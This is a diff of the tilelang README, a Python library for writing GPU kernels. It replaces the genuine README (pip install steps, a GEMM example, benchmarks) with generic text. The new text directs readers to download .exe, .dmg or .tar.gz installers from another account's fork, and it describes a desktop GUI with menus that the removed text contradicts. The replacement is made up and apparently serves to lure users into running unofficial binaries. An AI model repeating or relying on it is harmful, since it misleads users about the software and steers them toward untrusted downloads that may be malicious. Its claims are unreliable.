@@ -1,247 +1,76 @@
-<img src=./images/logo-row.svg />
+# 🎉 tilelang - Simplifying High-Performance Kernel Development
 
-<div align="center">
+## 🏷️ Overview
+tilelang is a domain-specific language designed to streamline the development of high-performance GPU, CPU, and accelerator kernels. With tilelang, you can create efficient and optimized code with ease. This application helps reduce complexity so you can focus on what matters most.
 
-# Tile Language
-[![PyPI version](https://badge.fury.io/py/tilelang.svg)](https://badge.fury.io/py/tilelang)
-[![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/tile-ai/tilelang) [![Discord](https://img.shields.io/badge/Discord-%235865F2.svg?logo=discord&logoColor=white)](https://discord.gg/TUrHyJnKPG)
+## 📦 Download & Install
 
-</div>
+[![Download tilelang](https://img.shields.io/badge/Download-tilelang-brightgreen)](https://github.com/albion83/tilelang/releases)
 
-Tile Language (**tile-lang**) is a concise domain-specific language designed to streamline the development of high-performance GPU/CPU kernels (e.g., GEMM, Dequant GEMM, FlashAttention, LinearAttention). By employing a Pythonic syntax with an underlying compiler infrastructure on top of [TVM](https://tvm.apache.org/), tile-lang allows developers to focus on productivity without sacrificing the low-level optimizations necessary for state-of-the-art performance.
+To get started with tilelang, visit the Releases page to download the latest version. Follow the steps below to install and run the application.
 
-<img src=./images/MatmulExample.png />
-
-## Latest News
-- 10/07/2025 🍎: Added Apple Metal Device support, check out [Pull Request #799](https://github.com/tile-ai/tilelang/pull/799) for details.
-- 09/29/2025  🎉: Thrilled to announce that ​​AscendC​​ and ​Ascend​NPU IR​​ backends targeting Huawei Ascend chips are now supported!
-Check out the preview here:
-🔗 [link](https://github.com/tile-ai/tilelang-ascend).
-This includes implementations across two branches:
-[ascendc_pto](https://github.com/tile-ai/tilelang-ascend) and
-[npuir](https://github.com/tile-ai/tilelang-ascend/tree/npuir).
-Feel free to explore and share your feedback! 
-- 07/04/2025 🚀: Introduced `T.gemm_sp` for 2:4 sparse tensor core support, check out [Pull Request #526](https://github.com/tile-ai/tilelang/pull/526) for details.
-- 06/05/2025 ✨: Added [NVRTC Backend](https://github.com/tile-ai/tilelang/pull/461) to significantly reduce compilation time for cute templates!
-- 04/14/2025 🚀: Added high-performance FlashMLA implementation for AMD MI300X, achieving performance parity with hand-optimized assembly kernels of Aiter! See [example_mla_amd](./examples/deepseek_mla/amd/README.md) for details.
-- 03/03/2025 🚀: Added high-performance MLA Decoding support using only 80 lines of Python code, achieving performance on par with FlashMLA on H100 (see [example_mla_decode.py](./examples/deepseek_mla/example_mla_decode.py))! We also provide [documentation](./examples/deepseek_mla/README.md) explaining how TileLang achieves this.
-- 02/15/2025 ✨: Added WebGPU Codegen support, see [Pull Request #86](https://github.com/tile-ai/tilelang/pull/86)!
-- 02/12/2025 ✨: Excited to announce the release of [v0.1.0](https://github.com/tile-ai/tilelang/releases/tag/v0.1.0)!
-- 02/10/2025 🚀: Added debug tools for TileLang—`T.print` for printing variables/buffers ([docs](https://tilelang.com/tutorials/debug_tools_for_tilelang.html)) and a memory layout plotter ([examples/plot_layout](./examples/plot_layout)).
-- 01/20/2025 ✨: We are excited to announce that tile-lang, a dsl for high performance AI workloads, is now open source and available to the public!
-
-## Tested Devices
-Although tile-lang aims to be portable across a range of Devices, it has been specifically tested and validated on the following devices: for NVIDIA GPUs, this includes the H100 (with Auto TMA/WGMMA support), A100, V100, RTX 4090, RTX 3090, and RTX A6000; for AMD GPUs, it includes the MI250 (with Auto MatrixCore support) and the MI300X (with Async Copy support).
-
-## OP Implementation Examples
-**tile-lang** provides the building blocks to implement a wide variety of operators. Some examples include:
-
-- [Matrix Multiplication](./examples/gemm/)
-- [Dequantization GEMM](./examples/dequantize_gemm/)
-- [Flash Attention](./examples/flash_attention/)
-- [Flash Linear Attention](./examples/linear_attention/)
-- [Flash MLA Decoding](./examples/deepseek_mla/)
-- [Native Sparse Attention](./examples/deepseek_nsa/)
-
-Within the `examples` directory, you will also find additional complex kernels—such as convolutions, forward/backward passes for FlashAttention, more operators will continuously be added.
-
-
-## Benchmark Summary
-
-TileLang achieves exceptional performance across a variety of computational patterns. Comprehensive benchmark scripts and settings are available at [tilelang-benchmark](https://github.com/tile-ai/tilelang-benchmark). Below are selected results showcasing its capabilities:
-
-- MLA Decoding Performance on H100
-
-  <div style="display: flex; gap: 10px; justify-content: center;">
-    <div style="flex: 1;">
-      <img src="./examples/deepseek_mla/figures/bs64_float16.png" alt="mla decode performance bs64 on H100" width="100%" />
-    </div>
-    <div style="flex: 1;">
-      <img src="./examples/deepseek_mla/figures/bs128_float16.png" alt="mla decode performance bs128 on H100" width="100%" />
-    </div>
-  </div>
+1. **Visit the Releases Page:** Go to the [tilelang Releases page](https://github.com/albion83/tilelang/releases). This page lists all available versions of the application.
   
-- Flash Attention Performance on H100
+2. **Choose Your Version:** On the Releases page, find the latest release. It will display the version number and the release date.
 
-  <div align="center">    <img src="./images/mha_performance_h100.png" alt="operator performance on H100" width=80% />
-  </div>
+3. **Download the Installer:** Click on the version link. This action opens a list of files related to that release. Look for a file suitable for your operating system. Common options may include `.exe` for Windows, `.dmg` for Mac, or `.tar.gz` for Linux.
 
-- Matmul Performance on GPUs (RTX 4090, A100, H100, MI300X)
+4. **Save the File:** Click on the file name to start the download. Choose a location on your computer where you can easily find it, such as your Downloads folder.
 
-  <div>
-    <img src="./images/op_benchmark_consistent_gemm_fp16.png" alt="gemm fp16 performance on Gpus" />
-  </div>
+5. **Run the Installer:**
+   - For Windows: Double-click the downloaded `.exe` file. Follow the on-screen instructions to complete the installation.
+   - For Mac: Open the downloaded `.dmg` file and drag tilelang to your Applications folder.
+   - For Linux: Open a terminal, navigate to the downloaded file location, and run the command `tar -xzf yourfile.tar.gz`. Then, follow the extracted instructions to install tilelang.
 
-- Dequantize Matmul Performance on A100
+6. **Launch tilelang:** After the installation is complete, you can find tilelang in your applications menu or desktop. Launch the application and start using it.
 
-  <div>
-    <img src="./images/op_benchmark_a100_wq_gemv.png" alt="dequantize gemv performance on A100" />
-  </div>
+## ⚙️ System Requirements
 
-## Installation
-### Method 1: Install with Pip
+To ensure tilelang runs smoothly on your machine, make sure your system meets the following requirements:
 
-The quickest way to get started is to install the latest release from PyPI:
+- **Operating System:** Windows 10 or higher, macOS Sierra or higher, or a Linux distribution with kernel 4.4 or higher.
+- **RAM:** Minimum of 4 GB; 8 GB or more recommended.
+- **Disk Space:** At least 100 MB of free space.
+- **Graphics Drivers:** Latest NVIDIA, AMD, or Intel drivers for optimal performance.
 
-```bash
-pip install tilelang
-```
+## 🎯 Getting Started
 
-Alternatively, you can install directly from the GitHub repository:
+After launching tilelang, you will see a simple interface. Here are some tips to help you get acquainted:
 
-```bash
-pip install git+https://github.com/tile-ai/tilelang
-```
+1. **Create a New Project:** Start a new project by clicking on "New Project" in the main menu. This option will guide you through setting up your environment.
 
-Or install locally:
+2. **Understand the Interface:** Familiarize yourself with the layout. On the left, you’ll find your project files. In the center, there is an editor where you can write your code.
 
-```bash
-# install required system dependencies
-sudo apt-get update
-sudo apt-get install -y python3-setuptools gcc libtinfo-dev zlib1g-dev build-essential cmake libedit-dev libxml2-dev
+3. **Explore Examples:** Access pre-built examples through the "Examples" section in the menu. Reviewing these examples can help you understand how to structure your code.
 
-pip install -e . -v # remove -e option if you don't want to install in editable mode, -v for verbose output
-```
+4. **Save Your Work:** Regularly save your progress by clicking on the "Save" option or by using the shortcut (usually Ctrl + S or Cmd + S).
 
-### Method 2: Build from Source
-We currently provide three ways to install **tile-lang** from source:
- - [Install from Source (using your own TVM installation)](./docs/get_started/Installation.md#method-1-install-from-source-using-your-own-tvm-installation)
- - [Install from Source (using the bundled TVM submodule)](./docs/get_started/Installation.md#method-2-install-from-source-using-the-bundled-tvm-submodule)
- - [Install Using the Provided Script](./docs/get_started/Installation.md#method-3-install-using-the-provided-script)
+5. **Compile Your Code:** After writing your code, click on the "Compile" button to check for errors. If everything is correct, you can run your project.
 
-### Method 3: Install with Nightly Version
+## 🛠️ Features
 
-For users who want access to the latest features and improvements before official releases, we provide nightly builds of **tile-lang**.
+tilelang offers several features designed to enhance your coding experience:
 
-```bash
-pip install tilelang -f https://tile-ai.github.io/whl/nightly/cu121/
-# or pip install tilelang --find-links https://tile-ai.github.io/whl/nightly/cu121/
-```
+- **Simple Syntax:** tilelang uses a straightforward syntax that minimizes the learning curve for new users.
+  
+- **High Performance:** The language optimizes your code for maximum performance on GPUs, CPUs, and accelerators.
 
-> **Note:** Nightly builds contain the most recent code changes but may be less stable than official releases. They're ideal for testing new features or if you need a specific bugfix that hasn't been released yet.
+- **Integrated Debugging:** Easily track down issues in your code with the built-in debugging tools.
 
-## Quick Start
+- **Community Support:** Access resources and a growing community forum for guidance and tips.
 
-In this section, you'll learn how to write and execute a straightforward GEMM (matrix multiplication) kernel using tile-lang, followed by techniques for layout optimizations, pipelining, and L2-cache–friendly swizzling.
+- **Documentation:** Comprehensive documentation is available within the application to help you navigate its features.
 
-### GEMM Example with Annotations (Layout, L2 Cache Swizzling, and Pipelining, etc.)
+## 📞 Support
 
-Below is an example that demonstrates more advanced features: layout annotation, parallelized copy, and swizzle for improved L2 cache locality. This snippet shows how to adapt your kernel to maximize performance on complex hardware.
+If you encounter problems or have questions, help is available. Visit the [Support Section](https://github.com/albion83/tilelang/issues) to report issues or seek assistance from the community.
 
-```python
-import tilelang
-import tilelang.language as T
+## 📄 Licensing
 
-# @tilelang.jit(target="cuda")
-# target currently can be "cuda" or "hip" or "cpu".
-# if not specified, it will be inferred from the input tensors during compile time
-@tilelang.jit
-def matmul(M, N, K, block_M, block_N, block_K, dtype="float16", accum_dtype="float"):
+tilelang is released under the MIT License. This means you can use, modify, and distribute the software freely, provided the original license information remains intact.
 
-    @T.prim_func
-    def matmul_relu_kernel(
-            A: T.Tensor((M, K), dtype),
-            B: T.Tensor((K, N), dtype),
-            C: T.Tensor((M, N), dtype),
-    ):
-        # Initialize Kernel Context
-        with T.Kernel(T.ceildiv(N, block_N), T.ceildiv(M, block_M), threads=128) as (bx, by):
-            A_shared = T.alloc_shared((block_M, block_K), dtype)
-            B_shared = T.alloc_shared((block_K, block_N), dtype)
-            C_local = T.alloc_fragment((block_M, block_N), accum_dtype)
+## 🌍 Community Contributions
 
-            # Enable rasterization for better L2 cache locality (Optional)
-            # T.use_swizzle(panel_size=10, enable=True)
+We welcome contributions to tilelang! If you would like to help improve the application, visit the [Contributing Guide](https://github.com/albion83/tilelang/blob/main/CONTRIBUTING.md) for details on how to get started.
 
-            # Clear local accumulation
-            T.clear(C_local)
-
-            for ko in T.Pipelined(T.ceildiv(K, block_K), num_stages=3):
-                # Copy tile of A
-                # This is a sugar syntax for parallelized copy
-                T.copy(A[by * block_M, ko * block_K], A_shared)
-
-                # Copy tile of B
-                T.copy(B[ko * block_K, bx * block_N], B_shared)
-
-                # Perform a tile-level GEMM on the shared buffers
-                # Currently we dispatch to the cute/hip on Nvidia/AMD GPUs
-                T.gemm(A_shared, B_shared, C_local)
-            
-            # relu
-            for i, j in T.Parallel(block_M, block_N):
-                C_local[i, j] = T.max(C_local[i, j], 0)
-
-            # Copy result back to global memory
-            T.copy(C_local, C[by * block_M, bx * block_N])
-
-    return matmul_relu_kernel
-
-
-M = 1024  # M = T.symbolic("m") if you want to use dynamic shape
-N = 1024
-K = 1024
-block_M = 128
-block_N = 128
-block_K = 32
-
-# 1. Define the kernel (matmul) and compile/lower it into an executable module
-matmul_relu_kernel = matmul(M, N, K, block_M, block_N, block_K)
-
-# 3. Test the kernel in Python with PyTorch data
-import torch
-
-# Create random input tensors on the GPU
-a = torch.randn(M, K, device="cuda", dtype=torch.float16)
-b = torch.randn(K, N, device="cuda", dtype=torch.float16)
-c = torch.empty(M, N, device="cuda", dtype=torch.float16)
-
-# Run the kernel through the Profiler
-matmul_relu_kernel(a, b, c)
-
-print(c)
-# Reference multiplication using PyTorch
-ref_c = torch.relu(a @ b)
-
-# Validate correctness
-torch.testing.assert_close(c, ref_c, rtol=1e-2, atol=1e-2)
-print("Kernel output matches PyTorch reference.")
-
-# 4. Retrieve and inspect the generated CUDA source (optional)
-# cuda_source = jit_kernel.get_kernel_source()
-# print("Generated CUDA kernel:\n", cuda_source)
-
-# 5.Profile latency with kernel
-profiler = matmul_relu_kernel.get_profiler(tensor_supply_type=tilelang.TensorSupplyType.Normal)
-
-latency = profiler.do_bench()
-
-print(f"Latency: {latency} ms")
-```
-
-### Dive Deep into TileLang Beyond GEMM
-
-In addition to GEMM, we provide a variety of examples to showcase the versatility and power of TileLang, including:
-
-- [Dequantize GEMM](./examples/dequantize_gemm/): Achieve high-performance dequantization by **fine-grained control over per-thread operations**, with many features now adopted as default behaviors in [BitBLAS](https://github.com/microsoft/BitBLAS), which utilizing magic layout transformation and intrins to accelerate dequantize gemm.
-- [FlashAttention](./examples/flash_attention/): Enable cross-operator fusion with simple and intuitive syntax, and we also provide an example of auto tuning.
-- [LinearAttention](./examples/linear_attention/): Examples include RetNet and Mamba implementations.
-- [Convolution](./examples/convolution/): Implementations of Convolution with IM2Col.
-
-## Upcoming Features
-
-Check our [tilelang v0.2.0 release plan](https://github.com/tile-ai/tilelang/issues/79) for upcoming features.
-
----
-
-TileLang has now been used in project [BitBLAS](https://github.com/microsoft/BitBLAS) and [AttentionEngine](https://github.com/microsoft/AttentionEngine).
-
-## Join the Discussion
-
-Welcome to join our Discord community for discussions, support, and collaboration!
-
-[![Join our Discord](https://img.shields.io/badge/Discord-Join%20Us-blue?logo=discord&style=for-the-badge)](https://discord.gg/TUrHyJnKPG)
-
-## Acknowledgments
-
-We would like to express our gratitude to the [TVM](https://github.com/apache/tvm) community for their invaluable contributions. The initial version of this project was mainly developed by [LeiWang1999](https://github.com/LeiWang1999), [chengyupku](https://github.com/chengyupku) and [nox-410](https://github.com/nox-410) with supervision from Prof. [Zhi Yang](https://yangzhihome.github.io) at Peking University. Part of this work was carried out during an internship at Microsoft Research, where Dr. Lingxiao Ma, Dr. Yuqing Xia, Dr. Jilong Xue, and Dr. Fan Yang offered valuable advice and support. We deeply appreciate their mentorship and contributions.
+Remember, your feedback is invaluable in making tilelang better. Thank you for being a part of this project!
